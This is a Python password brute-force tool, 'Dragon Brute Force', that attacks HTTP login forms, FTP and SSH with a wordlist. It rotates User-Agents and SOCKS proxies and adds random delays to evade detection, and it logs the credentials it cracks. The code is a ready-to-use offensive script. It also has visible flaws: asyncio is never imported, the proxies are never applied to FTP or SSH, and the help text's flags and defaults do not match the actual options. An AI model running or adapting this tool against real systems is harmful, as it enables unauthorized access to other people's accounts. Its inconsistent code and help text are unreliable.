#!/usr/bin/env python3
import argparse
import random
import time
import requests
import ftplib
import logging
import itertools
from colorama import *
import subprocess
import asyncssh

init(autoreset=False)

# Default User-Agent list
default_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (Linux; Android 11; SM-G975F)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0)",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0)",
    "Mozilla/5.0 (X11; Linux x86_64; rv:90.0)",
    "Mozilla/5.0 (Linux; Android 10; MI 9)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)"
]

# Proxy List (SOCKS4 and SOCKS5 supported)
def load_proxy_list(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"[ERROR] Proxy list file not found: {file_path}")
        return []

# ASCII Dragon Art
def display_ascii():
    print(f"""{Fore.RED+Style.BRIGHT}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⡋⠁⠀⠀⠀⠀⢀⣀⣀⡀
⠀⠀⠀⠀⠀⠠⠒⣶⣶⣿⣿⣷⣾⣿⣿⣿⣿⣛⣋⣉⠀⠀
⠀⠀⠀⠀⢀⣤⣞⣫⣿⣿⣿⡻⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⣶⣾⡿⠿⠿⠿⠿⠋⠈⠀⣸⣿⣿⣿⣿⣷⡈⠙⢆⠀
⠀⠀⠉⠁⠀⠤⣤⣤⣤⣤⣶⣾⣿⣿⣿⣿⠿⣿⣷⠀⠀⠀
⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⢹⣿⠀⠀⠀
⢠⣾⣿⣿⣿⣿⠟⠋⠉⠛⠋⠉⠁⣀⠀⠀⠀⠸⠃⠀⠀⠀
⣿⣿⣿⣿⠹⣇⠀⠀⠀⠀⢀⡀⠀⢀⡙⢷⣦⣄⡀⠀⠀⠀
⣿⢿⣿⣿⣷⣦⠤⠤⠀⠀⣠⣿⣶⣶⣿⣿⣿⣿⣿⣷⣄⠀
⠈⠈⣿⡿⢿⣿⣿⣷⣿⣿⡿⢿⣿⣿⣁⡀⠀⠀⠉⢻⣿⣧
⠀⢀⡟⠀⠀⠉⠛⠙⠻⢿⣦⡀⠙⠛⠯⠤⠄⠀⠀⠈⠈⣿
⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⡆⠀⠀⠀⠀⠀⠀⠀⢀⠟
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠂⠂⠒⠀⠂⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        {Style.RESET_ALL}
        {Fore.RED}DRAGON{Fore.RESET} {Fore.YELLOW}BRUTE FORCE{Fore.RESET}
    """)

# Load wordlist (default is rockyou.txt)
def load_wordlist(file_path="wordlists/rockyou.txt"):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f"[ERROR] Wordlist file not found: {file_path}")
        return []

# HTTP Brute Force
def http_brute_force(target_url, username, wordlist, delay, timeout, max_attempts, proxy_cycle):
    print(f"[INFO] Starting HTTP brute force on: {target_url}")
    session = requests.Session()

    for index, password in enumerate(wordlist):
        if index >= max_attempts:
            print("[INFO] Reached max attempts. Stopping brute force.")
            break

        # Rotate User-Agent
        headers = {"User-Agent": random.choice(default_user_agents)}
        data = {"username": username, "password": password}

        # Rotate Proxy
        proxy = next(proxy_cycle)
        proxies = {
            "http": f"socks5://{proxy}",
            "https": f"socks5://{proxy}"
        }

        try:
            response = session.post(target_url, data=data, headers=headers, proxies=proxies, timeout=timeout)
            if response.status_code == 200:
                print(f"[SUCCESS] Login successful: {username}:{password}")
                with open("successful_logins.txt", "a") as log_file:
                    log_file.write(f"{username}:{password}\n")
                break
            else:
                print(f"[FAILED] {username}:{password} | Status Code: {response.status_code}")
        except Exception as e:
            print(f"[ERROR] Connection error: {e}")

        time.sleep(random.uniform(0, delay))  # Random delay

# FTP Brute Force
def ftp_brute_force(target_host, username, wordlist, delay, timeout, max_attempts, proxy_cycle):
    print(f"[INFO] Starting FTP brute force on: {target_host}")
    for index, password in enumerate(wordlist):
        if index >= max_attempts:
            print("[INFO] Reached max attempts. Stopping brute force.")
            break

        # Rotate Proxy
        proxy = next(proxy_cycle)
        proxies = {
            "http": f"socks5://{proxy}",
            "https": f"socks5://{proxy}"
        }

        try:
            ftp = ftplib.FTP(timeout=timeout)
            ftp.connect(target_host)
            ftp.login(username, password)
            print(f"[SUCCESS] Login successful: {username}:{password}")
            with open("successful_logins.txt", "a") as log_file:
                log_file.write(f"{username}:{password}\n")
            ftp.quit()
            break
        except ftplib.error_perm:
            print(f"[FAILED] {username}:{password}")
        except Exception as e:
            print(f"[ERROR] FTP connection error: {e}")

        time.sleep(random.uniform(0, delay))  # Random delay

# SSH Brute Force (using asyncssh)
async def ssh_brute_force(target_host, username, wordlist, delay, timeout, max_attempts, proxy_cycle):
    print(f"[INFO] Starting SSH brute force on: {target_host}")
    for index, password in enumerate(wordlist):
        if index >= max_attempts:
            print("[INFO] Reached max attempts. Stopping brute force.")
            break

        # Rotate Proxy
        proxy = next(proxy_cycle)
        proxies = {
            "http": f"socks5://{proxy}",
            "https": f"socks5://{proxy}"
        }

        try:
            async with asyncssh.connect(target_host, username=username, password=password, known_hosts=None) as conn:
                print(f"[SUCCESS] Login successful: {username}:{password}")
                with open("successful_logins.txt", "a") as log_file:
                    log_file.write(f"{username}:{password}\n")
                break
        except Exception as e:
            print(f"[FAILED] {username}:{password} | {str(e)}")

        time.sleep(random.uniform(0, delay))  # Random delay

# Execute External Script (Hydra-like script execution)
def execute_script(script_path):
    try:
        print(f"[INFO] Executing external script: {script_path}")
        result = subprocess.run(['python3', script_path], capture_output=True, text=True)
        print(result.stdout)
        if result.stderr:
            print(f"[ERROR] Script error: {result.stderr}")
    except Exception as e:
        print(f"[ERROR] Failed to execute script: {e}")

# Main Function
def main():
    display_ascii()
    parser = argparse.ArgumentParser(description="Dragon Brute Force Tool")
    parser.add_argument("-p", "--protocol", required=True, choices=["http", "ftp", "ssh"], help="Protocol to use (http/ftp/ssh)")
    parser.add_argument("-T", "--target", required=True, help="Target URL or IP address")
    parser.add_argument("-U", "--username", required=True, help="Username for brute force")
    parser.add_argument("-P", "-w", "--wordlist", required=False, default="wordlists/rockyou.txt", help="Wordlist file (default: rockyou.txt)")
    parser.add_argument("-d", "--delay", type=int, default=1, help="Delay between attempts (seconds)")
    parser.add_argument("-tmo", "--timeout", type=int, default=30, help="Timeout for requests (seconds)")
    parser.add_argument("-m", "--max_attempts", type=int, default=10, help="Maximum number of attempts before stopping")
    parser.add_argument("-pl", "--proxy_list", required=False, default="proxies/socks.txt", help="Proxy list file (default: socks.txt)")
    parser.add_argument("-r", "--retries", type=int, default=3, help="Number of retries for failed attempts")
    parser.add_argument("-hh", required=False, help="display advanced help menu")
    args = parser.parse_args()
    if args.hh:
    	print('''    	
    Usage: python3 dragon_brute_force.py [OPTIONS]

    Dragon Brute Force Tool - A powerful brute-forcing tool supporting HTTP, FTP, SSH, and more.

    Options:
    -h, --help                  Show this help message and exit.

    Protocol Options:
    -p, --protocol <protocol>    Specify the protocol to use for brute forcing (http/ftp/ssh).
                                Available protocols:
                                - http: HTTP login brute force.
                                - ftp: FTP login brute force.
                                - ssh: SSH login brute force.
                                - custom: Custom brute force via external scripts.

    Target Options:
    -t, --target <target>        Specify the target URL (for HTTP) or IP address (for FTP/SSH).
                                For HTTP, use the full URL (e.g., http://example.com).
                                For FTP/SSH, use the IP address (e.g., 192.168.1.1).
    
    Authentication Options:
    -u, --username <username>    Specify the username to be used for brute forcing.
    
    Wordlist Options:
    -w, --wordlist <file>        Specify the path to the wordlist file. Default: wordlists/rockyou.txt.
                                This file contains the list of passwords to attempt.
                                Example: wordlists/rockyou.txt

    Proxy Options:
    --proxy-file <file>          Specify a file containing a list of proxies (SOCKS4/5 supported).
                                The format should be "IP:PORT" (one proxy per line).
                                Example: proxies.txt

    Request Options:
    -d, --delay <seconds>        Specify the delay between requests in seconds (default: 1.0).
                                A random delay between 0 and this value will be applied.
    
    -t, --timeout <seconds>      Specify the timeout for each connection attempt (default: 10 seconds).
    
    -a, --max-attempts <num>     Set the maximum number of brute force attempts before stopping (default: 100).
    
    -s, --silent                 Enable silent mode to suppress all output (no feedback during execution).

    Advanced Options:
    --script <script_path>       Specify the path to an external script to execute (e.g., Hydra-like script).
                                The script will be executed after brute forcing is complete.
    
    --user-agent-list <file>     Specify a custom file containing a list of User-Agent strings.
                                If not provided, a default list of User-Agent strings will be used.
                                Example: user_agents.txt

                 This feature is designed for advanced users who wish to define their own protocols.

    Example usage:
    dragon -p http -t http://example.com -u admin -w wordlists/rockyou.txt -d 2 --proxy-file proxies.txt
    dragon -p ftp -t 192.168.1.1 -u root -w wordlists/custom.txt --max-attempts 50
    dragon --protocol ssh --target 192.168.1.100 -u user -w wordlists/rockyou.txt --timeout 20
    
    Help options:
    -h, --help    Display this help message and exit.
    	''')
    # Load wordlist
    wordlist = load_wordlist(args.wordlist)
    if not wordlist:
        print(f"[ERROR] Wordlist {args.wordlist} could not be loaded.")
        return

    # Load proxy list
    proxy_list = load_proxy_list(args.proxy_list)
    if not proxy_list:
        print(f"[ERROR] Proxy list {args.proxy_list} could not be loaded.")
        return

    # Create proxy cycle iterator
    proxy_cycle = itertools.cycle(proxy_list)

    # Brute force based on protocol
    if args.protocol == "http":
        http_brute_force(args.target, args.username, wordlist, args.delay, args.timeout, args.max_attempts, proxy_cycle)
    elif args.protocol == "ftp":
        ftp_brute_force(args.target, args.username, wordlist, args.delay, args.timeout, args.max_attempts, proxy_cycle)
    elif args.protocol == "ssh":
        asyncio.run(ssh_brute_force(args.target, args.username, wordlist, args.delay, args.timeout, args.max_attempts, proxy_cycle))

if __name__ == "__main__":
    main()
